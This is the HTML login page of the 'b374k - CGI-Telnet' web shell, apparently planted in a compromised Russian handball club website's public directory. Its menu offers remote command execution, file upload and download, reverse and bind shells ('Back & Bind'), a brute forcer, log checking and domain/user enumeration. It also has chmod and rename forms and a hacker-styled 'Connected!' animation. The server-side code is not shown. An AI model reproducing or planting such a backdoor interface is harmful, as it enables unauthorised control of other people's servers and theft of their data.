<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>Hacsugia</title>



</head>
<style>
body{
font: 10pt Verdana;
}
tr {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
color: #ff9900;
}
td {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
color: #2BA8EC;
font: 10pt Verdana;
}

table {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
BACKGROUND-COLOR: #111;
}


input {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
BACKGROUND-COLOR: Black;
font: 10pt Verdana;
color: #ff9900;
}

input.submit {
text-shadow: 0pt 0pt 0.3em cyan, 0pt 0pt 0.3em cyan;
color: #FFFFFF;
border-color: #009900;
}

code {
border			: dashed 0px #333;
BACKGROUND-COLOR: Black;
font: 10pt Verdana bold;
color: while;
}

run {
border			: dashed 0px #333;
font: 10pt Verdana bold;
color: #FF00AA;
}

textarea {
BORDER-RIGHT:  #3e3e3e 1px solid;
BORDER-TOP:    #3e3e3e 1px solid;
BORDER-LEFT:   #3e3e3e 1px solid;
BORDER-BOTTOM: #3e3e3e 1px solid;
BACKGROUND-COLOR: #1b1b1b;
font: Fixedsys bold;
color: #aaa;
}
A:link {
	COLOR: #2BA8EC; TEXT-DECORATION: none
}
A:visited {
	COLOR: #2BA8EC; TEXT-DECORATION: none
}
A:hover {
	text-shadow: 0pt 0pt 0.3em cyan, 0pt 0pt 0.3em cyan;
	color: #ff9900; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}

.listdir tr:hover{
	background: #444;
}
.listdir tr:hover td{
	background: #444;
	text-shadow: 0pt 0pt 0.3em cyan, 0pt 0pt 0.3em cyan;
	color: #FFFFFF; TEXT-DECORATION: none;
}
.notline{
	background: #111;
}
.line{
	background: #222;
}
</style>
<script language="javascript">
function chmod_form(i,file)
{
	/*var ajax='ajax_PostData("FormPerms_'+i+'","","ResponseData"); return false;';*/
	var ajax="";
	document.getElementById("FilePerms_"+i).innerHTML="<form name=FormPerms_" + i+ " action=' method='POST'><input id=text_" + i + "  name=chmod type=text size=5 /><input type=submit class='submit' onclick='" + ajax + "' value=OK><input type=hidden name=a value='gui'><input type=hidden name=d value='/home/b/boewic/handball-taganrog.ru/public_html/docs/idx_cgi'><input type=hidden name=f value='"+file+"'></form>";
	document.getElementById("text_" + i).focus();
}
function rm_chmod_form(response,i,perms,file)
{
	response.innerHTML = "<span onclick=\"chmod_form(" + i + ",'"+ file+ "')\" >"+ perms +"</span></td>";
}
function rename_form(i,file,f)
{
	var ajax="";
	f.replace(/\\/g,"\\\\");
	var back="rm_rename_form("+i+",\""+file+"\",\""+f+"\"); return false;";
	document.getElementById("File_"+i).innerHTML="<form name=FormPerms_" + i+ " action=' method='POST'><input id=text_" + i + "  name=rename type=text value= '"+file+"' /><input type=submit class='submit' onclick='" + ajax + "' value=OK><input type=submit class='submit' onclick='" + back + "' value=Cancel><input type=hidden name=a value='gui'><input type=hidden name=d value='/home/b/boewic/handball-taganrog.ru/public_html/docs/idx_cgi'><input type=hidden name=f value='"+file+"'></form>";
	document.getElementById("text_" + i).focus();
}
function rm_rename_form(i,file,f)
{
	if(f=='f')
	{
		document.getElementById("File_"+i).innerHTML="<a href='?a=command&d=/home/b/boewic/handball-taganrog.ru/public_html/docs/idx_cgi&c=edit%20"+file+"%20'>" +file+ "</a>";
	}else
	{
		document.getElementById("File_"+i).innerHTML="<a href='?a=gui&d="+f+"'>[ " +file+ " ]</a>";
	}
}
</script>
<body onLoad="document.f.p.focus()" bgcolor="#0c0c0c" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0">
<center><code>
<table border="1" width="100%" cellspacing="0" cellpadding="2">
<tr>
	<td align="center" rowspan=2>
		<b><font size="5"><font style='text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(300, 0, 0), 0px 0px 5px rgb(300, 0, 0); color:#ffffff; font-weight:bold;'>b374k - CGI-Telnet</font></font></b>
	</td>

	<td>

		<font face="Verdana" size="2"></font>
	</td>
	<td>Server IP:<font color="#cc0000"> </font> | Your IP: <font color="#000000"></font>
	</td>

</tr>

<tr>
<td colspan="3"><font face="Verdana" size="2">
<a href="">Home</a> |
<a href="?a=command&d=%2fhome%2fb%2fboewic%2fhandball%2dtaganrog%2eru%2fpublic%5fhtml%2fdocs%2fidx%5fcgi">Command</a> |
<a href="?a=gui&d=%2fhome%2fb%2fboewic%2fhandball%2dtaganrog%2eru%2fpublic%5fhtml%2fdocs%2fidx%5fcgi">GUI</a> |
<a href="?a=upload&d=%2fhome%2fb%2fboewic%2fhandball%2dtaganrog%2eru%2fpublic%5fhtml%2fdocs%2fidx%5fcgi">Upload File</a> |
<a href="?a=download&d=%2fhome%2fb%2fboewic%2fhandball%2dtaganrog%2eru%2fpublic%5fhtml%2fdocs%2fidx%5fcgi">Download File</a> |

<a href="?a=backbind">Back & Bind</a> |
<a href="?a=bruteforcer">Brute Forcer</a> |
<a href="?a=checklog">Check Log</a> |
<a href="?a=domainsuser">Domains/Users</a> |
<a href="?a=logout">Logout</a> |
<a target='_blank' href="#">Help</a>

</font></td>
</tr>
</table>
<font id="ResponseData" color="#ff99cc" >
<pre><script type="text/javascript">
TypingText = function(element, interval, cursor, finishedCallback) {
  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
    this.running = true;	// Never run.
    return;
  }
  this.element = element;
  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
  this.interval = (typeof interval == "undefined" ? 100 : interval);
  this.origText = this.element.innerHTML;
  this.unparsedOrigText = this.origText;
  this.cursor = (cursor ? cursor : "");
  this.currentText = "";
  this.currentChar = 0;
  this.element.typingText = this;
  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
  TypingText.all.push(this);
  this.running = false;
  this.inTag = false;
  this.tagBuffer = "";
  this.inHTMLEntity = false;
  this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
  if(this.running) return;
  if(typeof this.origText == "undefined") {
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);	// We haven't finished loading yet.  Have patience.
    return;
  }
  if(this.currentText == "") this.element.innerHTML = "";
//  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
  if(this.currentChar < this.origText.length) {
    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
      this.tagBuffer = "<";
      this.inTag = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
      this.tagBuffer += ">";
      this.inTag = false;
      this.currentText += this.tagBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inTag) {
      this.tagBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
      this.HTMLEntityBuffer = "&";
      this.inHTMLEntity = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
      this.HTMLEntityBuffer += ";";
      this.inHTMLEntity = false;
      this.currentText += this.HTMLEntityBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inHTMLEntity) {
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else {
      this.currentText += this.origText.charAt(this.currentChar);
    }
    this.element.innerHTML = this.currentText;
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
    this.currentChar++;
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
  } else {
	this.currentText = "";
	this.currentChar = 0;
        this.running = false;
        this.finishedCallback();
  }
}
</script>
</pre>

<font style="font: 15pt Verdana; color: yellow;">Copyright (C) 2001 Rohitab Batra </font><br><br>
<table align="center" border="1" width="600" heigh>
<tbody><tr>
<td valign="top" background="http://dl.dropbox.com/u/10860051/images/matran.gif"><p id="hack" style="margin-left: 3px;">
<font color="#009900"> Please Wait . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font> <br>

<font color="#009900"> Trying connect to Server . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font><br>
<font color="#F00000"><font color="#FFF000">~$</font> Connected ! </font><br>
<font color="#009900"><font color="#FFF000">~</font> Checking Server . . . . . . . . . . . . . . . . . . .</font> <br>

<font color="#009900"><font color="#FFF000">~</font> Trying connect to Command . . . . . . . . . . .</font><br>

<font color="#F00000"><font color="#FFF000">~</font>$ Connected Command! </font><br>
<font color="#009900"><font color="#FFF000">~<font color="#F00000">$</font></font> OK! You can kill it!</font>
</tr>
</tbody></table>
<br>

<script type="text/javascript">
new TypingText(document.getElementById("hack"), 30, function(i){ var ar = new Array("_",""); return " " + ar[i.length % ar.length]; });
TypingText.runAll();

</script>
<form name="f" method="POST" action="">
<input type="hidden" name="a" value="login">
Login : Administrator<br>
Password:<input type="password" name="p">
<input class="submit" type="submit" value="Enter">
</form>
<br><font color=red>o---[  <font color=#ff9900>Edit by <font style='text-shadow: 0px 0px 6px rgb(255, 0, 0), 0px 0px 5px rgb(300, 0, 0), 0px 0px 5px rgb(300, 0, 0); color:#ffffff; font-weight:bold;'>b374k - CGI-Telnet</font> </font>  ]---o</font></code></center></body></html>